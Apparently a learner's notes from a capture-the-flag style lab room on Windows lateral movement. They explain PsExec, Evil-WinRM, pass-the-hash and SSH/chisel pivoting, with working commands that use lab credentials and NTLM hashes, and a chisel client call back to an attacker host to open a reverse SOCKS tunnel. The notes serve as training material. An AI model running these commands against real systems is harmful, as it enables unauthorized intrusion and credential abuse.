the room is bugged so this will be mostly theory

# Lateral movement

## three pilars of lateral movement

```
moving from one compromised host to another

usually by using legitimate credentials or tokens
```

`move → harvest → move again`

1) Remote execution
 - running commands on a remote host

 - abusing legit protocols and services - hard to detect

 - `PsExec`, `SMB` to upload and execute a service binary

 - `WinRM` for an interactive PowerShell session over HTTP/S

 - `WMI` and `DCOM` as alternative execution paths

2) Credential reuse
 - if you have some hashes, then `Pass-the-Hash` let's you auth to other hosts

 - kerberos tickets ? `Pass-the-Ticket`

 - NTLM hashes can be converted to Kerberos tickets using `Overpass-the-Hash` mechanisms

3) Pivoting
 - networks are segmented

 - tunneling traffic through a host that has access to your and the target network to reach broader

 - `SSH tunnel` or `SOCKS proxy` can expose an entire subnet

### basic-est tools

`Impacket`
 - RCE suite

`NetExec (nxc)`
 - auth and execution

`Evil-WinRM`
 - PowerShell over WinRM

`SSH`
 - tunneling and pivoting


# RCE methods

### disclaimer:

we need to:
 - write to administrative shares
 - create services
 - interact with WMI (windows management instrumentation)

so there are some requirements...

1) the account we use must have local administrator rights on target host

2) exception: WinRM, it permits also the Remote Management Users group to do this

### PsExec

[Windows PsExec](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec)

we will use [Impacket psexec.py](https://github.com/fortra/impacket/blob/master/examples/psexec.py)

```
Impacket's psexec.py module

connect over SMB, upload a service binary and execute it

returns a shell running as NT AUTHORITY\SYSTEM
```

`WARNING`: it's **NOISY**

**How it works & why it's noisy:**

 - we upload a randomly named service executable to target's C:\Windows\
 - we create a service (generates `Event ID 7045` - new service installed)
 - we execute our service as LocalSystem and use named pipes to communicate with it
 - on exit the service is stopped, deleted and the binary is removed


psexec command (it will do everything for us):

`psexec.py thm.loc/jdoe:'Summer2026!'@192.168.13.61`

### Evil-WinRM
```
WinRM is a Microsoft protocol that provides remote shell access over HTTP/S

Evil-WinRM helps with exploiting WinRM and getting a powershell on the target host
```

connecting to 192.168.13.51 which is SERVER1, where we have a user (jdoe) who is a member of the Remote Management Users group.

PsExec would fail, because we are not admin

you can go with hash-authentication:

`evil-winrm -i TARGET -u Administrator -H NTLM_HASH`

or password:

`evil-winrm -i 192.168.13.51 -u jdoe -p 'Summer2026!'`

# Pass-the-Hash

```
NTLM authentication uses hashes instead of plain passwords

this means that if you have an NT (NTLM) hash, you can authenticatte without knowing the password

don't confuse NT hashes with Net-NTLMv2 hashes, which can not be used for pass-the-hash
```

psexec with -hashes flag uses only the NT hash (otherwise use LM:NT format)

`psexec.py -hashes :<NT_PART_OF_HASH> Administrator@192.168.13.51`

or evil-winrm in a similar way:

`evil-winrm -i 192.168.13.51 -u Administrator -H <NT_PART>`

# Pivoting

## port forwarding

### local port forwarding
kind of like a pipe

`ssh -L <local_port>:<target_host>:<target_port> <user>@<ssh_server> -N`

### dynamic port forwarding

more flexible, sets up a SOCKS proxy

the tools used must support SOCKS proxying

`ssh -f -D <local_port> <user>@<ssh_server> -N`

we will have to tweak ProxyChains to use our tunnel (the SOCKS proxy)

`nano /etc/proxychains.conf`

make sure to comment out already existing entries and append: `socks4 127.0.0.1 <local_port>`

of course, use the same local port as in the ssh command

to use proxychains, just prepend it to any command, eg.

`proxychains curl -s http://192.168.13.71`

proxychains psexec.py ...

for nmap always use `-sT` not `-sS` because SYN can't be used with SOCKS (it requires raw sockets)  

there is also `chisel` which is a tool for tunneling over HTTP/S

`chisel server --port 8080 --reverse`

on the target host, run:
`chisel.exe client <attacker_ip>:8080 R:1080:socks`